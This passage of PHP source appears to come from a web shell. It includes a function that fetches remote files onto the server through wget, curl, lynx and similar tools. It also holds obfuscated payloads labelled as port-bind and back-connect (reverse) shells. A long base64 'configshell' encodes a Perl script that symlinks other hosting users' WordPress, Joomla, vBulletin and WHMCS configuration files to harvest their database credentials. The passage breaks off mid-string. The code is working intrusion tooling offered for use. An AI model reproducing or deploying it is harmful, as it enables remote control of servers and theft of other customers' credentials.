        case 'wwget':
            exe(which('wget') . ' ' . $url . ' -O ' . $namafile);
        break;
        case 'wlynx':
            exe(which('lynx') . ' -source ' . $url . ' > ' . $namafile);
        break;
        case 'wfread':
            ambil($wurl, $namafile);
        break;
        case 'wfetch':
            exe(which('fetch') . ' -o ' . $namafile . ' -p ' . $url);
        break;
        case 'wlinks':
            exe(which('links') . ' -source ' . $url . ' > ' . $namafile);
        break;
        case 'wget':
            exe(which('GET') . ' ' . $url . ' > ' . $namafile);
        break;
        case 'wcurl':
            exe(which('curl') . ' ' . $url . ' -o ' . $namafile);
        break;
        default:
        break;
    }

    return $namafile;
}
function get_perms($file)
{
    if ($mode = @fileperms($file)) {
        $perms = '';
        $perms .= ($mode & 00400) ? 'r' : '-';
        $perms .= ($mode & 00200) ? 'w' : '-';
        $perms .= ($mode & 00100) ? 'x' : '-';
        $perms .= ($mode & 00040) ? 'r' : '-';
        $perms .= ($mode & 00020) ? 'w' : '-';
        $perms .= ($mode & 00010) ? 'x' : '-';
        $perms .= ($mode & 00004) ? 'r' : '-';
        $perms .= ($mode & 00002) ? 'w' : '-';
        $perms .= ($mode & 00001) ? 'x' : '-';

        return $perms;
    } else {
        return '??????????';
    }
}
function clearspace($text)
{
    return str_replace(' ', '_', $text);
}
// net tools
$port_bind_bd_c = 'bVNhb9owEP2OxH+4phI4NINAN00aYxJaW6maxqbSLxNDKDiXxiLYkW3KGOp/3zlOpo7xIY793jvf
+fl8KSQvdinCR2NTofr5p3br8hWmhXw6BQ9mYA8lmjO4UXyD9oSQaAV9AyFPCNRa+pRCWtgmQrJE
P/GIhufQg249brd4nmjo9RxBqyNAuwWOdvmyNAKJ+ywlBirhepctruOlW9MJdtzrkjTVKyFB41ZZ
dKTIWKb0hoUwmUAcwtFt6+m+EXKVJVtRHGAC07vV/ez2cfwvXSpticytkoYlVglX/fNiuAzDE6VL
3TfVrw4o2P1senPzsJrOfoRjl9cfhWjvIatzRvNvn7+s5o8Pt9OvURzWZV94dQgleag0C3wQVKug
Uq2FTFnjDzvxAXphx9cXQfxr6PcthLEo/8a8q8B9LgpkQ7oOgKMbvNeThHMsbSOO69IA0l05YpXk
HDT8HxrV0F4LizUWfE+M2SudfgiiYbONxiStebrgyIjfqDJG07AWiAzYBc9LivU3MVpGFV2x1J4W
tyxAnivYY8HVFsEqWF+/f7sBk2NRQKcDA/JtsE5MDm9EUG+MhcFqkpX0HmxGbqbkdBTMldaHRsUL
ZeoDeOSFBvpefCfXhflOpgTkvJ+jtKiR7vLohYKCqS2ZmMRj4Z5gQZfSiMbi6iqkdnHarEEXYuk6
uPtTdumsr0HC4q5rrzNifV7sC3ZWUmq+LVlVa5OfQjTanZYQO+Uf';
$port_bind_bd_pl = 'ZZJhT8IwEIa/k/AfjklgS2aA+BFmJDB1cW5kHSZGzTK2Qxpmu2wlYoD/bruBIfitd33uvXuvvWr1
NmXRW1DWy7HImo02ebRd19Kq1CIuV3BNtWGzQZeg342DhxcYwcCAHeCWCn1gDOEgi1yHhLYXzfwg
tNqKeut/yKJNiUB4skYhg3ZecMETnlmfKKrz4ofFX6h3RZJ3DUmUFaoTszO7jxzPDs0O8SdPEQkD
e/xs/gkYsN9DShG0ScwEJAXGAqGufmdq2hKFCnmu1IjvRkpH6hE/Cuw5scfTaWAOVE9pM5WMouM0
LSLK9HM3puMpNhp7r8ZFW54jg5wXx5YZLQUyKXVzwdUXZ+T3imYoV9ds7JqNOElQTjnxPc8kRrVo
vaW3c5paS16sjZo6qTEuQKU1UO/RSnFJGaagcFVbjUTCqeOZ2qijNLWzrD8PTe32X9oOgvM0bjGB
+hecfOQFlT4UcLSkmI1ceY3VrpKMy9dWUCVCBfTlQX6Owy8=';
$back_connect = 'fZFRS8MwFIXfB/sPWSw2hUrnqyPC0CpD3KStvqh0XRpcsE1KkoKF/XiTtCIV6tu55+Z89yY5W0St
ktGB8aihsprPWkVBKsgn1av5zCN1iQGsOv4Fbak6pWmNgU/JUQC4b3lRU3BR7OFqcFhptMOpo28j
S2whVulCflCNvXVy//K6fLdWI+SPcekMVpSlxIxTnRdacDSEAnA6gZJRBGMphbwC3uKNw8AhXEKZ
ja3ImclYagh61n9JKbTAhu7EobN3Qb4mjW/byr0BSnc3D3EWgqe7fLO1whp5miXx+tHMcNHpGURw
Tskvpd92+rxoKEdpdrvZhgBen/exUWf3nE214iT52+r/Cw3/5jaqhKL9iFFpuKPawILVNw==';
$back_connect_c = 'XVHbagIxEH0X/IdhhZLUWF1f1YKIBelFqfZJliUm2W7obiJJLLWl/94k29rWhyEzc+Z2TjpSserA
BYyt41JfldftVuc3d7R9q9mLcGeAEk5660sVAakc1FQqFBxqnhkBVlIDl95/3Wa43fpotyCABR95
zzpzYA7CaMq5yaUCK1VAYpup7XaYZpPE1NArIBmBRzgVtVYoJQMcR/jV3vKC1rI6wgSmN/niYb75
i+21cR4pnVYWUaclivcMM/xvRDjhysbHVwde0W+K0wzH9bt3YfRPingClVCnim7a/ZuJC0JTwf3A
RkD0fR+B9XJ2m683j/PpPYHFavW43CzzzWyFIfbIAhBiWinBHCo4AXSmFlxiuPB3E0/gXejiHMcY
jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F
6f9wGEPxJliFkv5Oqr4tE5LYEnoyIfDwdHcXK1ilrfAdUbPPLw==';
//confshell
$configshell = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iZW4tdXMiIC8+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4NCjx0aXRsZT5Qcml2OCBTeW1saW5rPC90aXRsZT4NCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+DQoubmV3U3R5bGUxIHsNCiBmb250LWZhbWlseTogVGFob21hOw0KIGZvbnQtc2l6ZTogeC1zbWFsbDsNCiBmb250LXdlaWdodDogYm9sZDsNCiBjb2xvcjogIzAwRkZGRjsNCiAgdGV4dC1hbGlnbjogY2VudGVyOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCic7DQpzdWIgbGlsew0KICAgICgkdXNlcikgPSBAXzsNCiRtc3IgPSBxeHtwd2R9Ow0KJGtvbGE9JG1zci4iLyIuJHVzZXI7DQoka29sYT1+cy9cbi8vZzsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC92Yi9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nfn52QnVsbGV0aW4xLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLid+fnZCdWxsZXRpbjIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJ35+dkJ1bGxldGluMy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jYy9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nfn52QnVsbGV0aW40LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRrb2xhLid+flBocGJiMS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nfn5QaHBiYjIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsJGtvbGEuJ35+V29yZHByZXNzMS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRrb2xhLid+fldvcmRwcmVzczIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fkpvb21sYTEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+Sm9vbWxhMi50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fkpvb21sYTMudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG0xLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htMy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTQudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZ3MvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTUudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htNi50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG03LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG04LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL29yZGVyL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG05LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmYucGhwJywka29sYS4nfn41LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRrb2xhLid+fjQudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZl9nbG9iYWwucGhwJywka29sYS4nfn5pbnZpc2lvLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGUvZGIucGhwJywka29sYS4nfn43LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Nvbm5lY3QucGhwJywka29sYS4nfn44LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21rX2NvbmYucGhwJywka29sYS4nfn5tay1wb3J0YWxlMS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlL2NvbmZpZy5waHAnLCRrb2xhLid+fjEyLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3NldHRpbmdzLnBocCcsJGtvbGEuJ35+U21mLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Z1bmN0aW9ucy5waHAnLCRrb2xhLid+fnBocGJiMy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlL2RiLnBocCcsJGtvbGEuJ35+aW5maW5pdHkudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLid+fnZCdWxsZXRpbjEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLid+fnZCdWxsZXRpbjIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLid+fnZCdWxsZXRpbjMudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NjL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLid+fnZCdWxsZXRpbjQudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRrb2xhLid+flBocGJiMS50eHQnKTsNCnN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJ35+UGhwYmIyLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwJywka29sYS4nfn5Xb3JkcHJlc3MxLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRrb2xhLid+fldvcmRwcmVzczIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5Kb29tbGExLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5Kb29tbGEyLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fkpvb21sYTMudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htMS50eHQnKTsNCnN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htYy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htMi50eHQnKTsNCnN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htMy50eHQnKTsNCnN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG00LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htNS50eHQnKTsNCnN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htNi50eHQnKTsNCnN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htNy50eHQnKTsNCnN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTgudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL29yZGVyL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG05LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25mLnBocCcsJGtvbGEuJ35+NS50eHQnKTsNCnN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZmlnLnBocCcsJGtvbGEuJ35+NC50eHQnKTsNCnN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZl9nbG9iYWwucGhwJywka29sYS4nfn5pbnZpc2lvLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlL2RiLnBocCcsJGtvbGEuJ35+Ny50eHQnKTsNCnN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY29ubmVjdC5waHAnLCRrb2xhLid+fjgudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL21rX2NvbmYucGhwJywka29sYS4nfn5tay1wb3J0YWxlMS50eHQnKTsNCnN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZS9jb25maWcucGhwJywka29sYS4nfn4xMi50eHQnKTsNCnN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2V0dGluZ3MucGhwJywka29sYS4nfn5TbWYudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Z1bmN0aW9ucy5waHAnLCRrb2xhLid+fnBocGJiMy50eHQnKTsNCnN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZS9kYi5waHAnLCRrb2xhLid+fmluZmluaXR5LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC92Yi9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nfn52QnVsbGV0aW4xLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nfn52QnVsbGV0aW4yLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nfn52QnVsbGV0aW4zLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jYy9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nfn52QnVsbGV0aW40LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywka29sYS4nfn5QaHBiYjEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLid+flBocGJiMi50eHQnKTsNCnN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsJGtvbGEuJ35+V29yZHByZXNzMS50eHQnKTsNCnN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwJywka29sYS4nfn5Xb3JkcHJlc3MyLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+Sm9vbWxhMS50eHQnKTsNCnN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+Sm9vbWxhMi50eHQnKTsNCnN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5Kb29tbGEzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG0vY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTMudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htNC50eHQnKTsNCnN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZ3MvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTUudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTYudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTcudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG04LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vcmRlci9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htOS50eHQnKTsNCnN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRrb2xhLid+fjUudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRrb2xhLid+fjQudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJGtvbGEuJ35+aW52aXNpby50eHQnKTsNCnN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZS9kYi5waHAnLCRrb2xhLid+fjcudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2Nvbm5lY3QucGhwJywka29sYS4nfn44LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ta19jb25mLnBocCcsJGtvbGEuJ35+bWstcG9ydGFsZTEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGUvY29uZmlnLnBocCcsJGtvbGEuJ35+MTIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3NldHRpbmdzLnBocCcsJGtvbGEuJ35+U21mLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9mdW5jdGlvbnMucGhwJywka29sYS4nfn5waHBiYjMudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGUvZGIucGhwJywka29sYS4nfn5pbmZpbml0eS50eHQnKTsNCnN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJ35+dkJ1bGxldGluMS50eHQnKTsNCnN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJ35+dkJ1bGxldGluMi50eHQnKTsNCnN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJ35+dkJ1bGxldGluMy50eHQnKTsNCnN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvY2MvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJ35+dkJ1bGxldGluNC50eHQnKTsNCnN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLnBocCcsJGtvbGEuJ35+UGhwYmIxLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nfn5QaHBiYjIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRrb2xhLid+fldvcmRwcmVzczEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsJGtvbGEuJ35+V29yZHByZXNzMi50eHQnKTsNCnN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fkpvb21sYTEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2cvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fkpvb21sYTIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+Sm9vbWxhMy50eHQnKTsNCnN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG0xLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG0yLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG0zLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTQudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG01LnR4dCcpOw0Kc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG02LnR4dCcpOw0Kc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG03LnR4dCcpOw0Kc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htOC50eHQnKTsNCnN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvb3JkZXIvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTkudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmYucGhwJywka29sYS4nfn41LnR4dCcpOw0Kc3ltb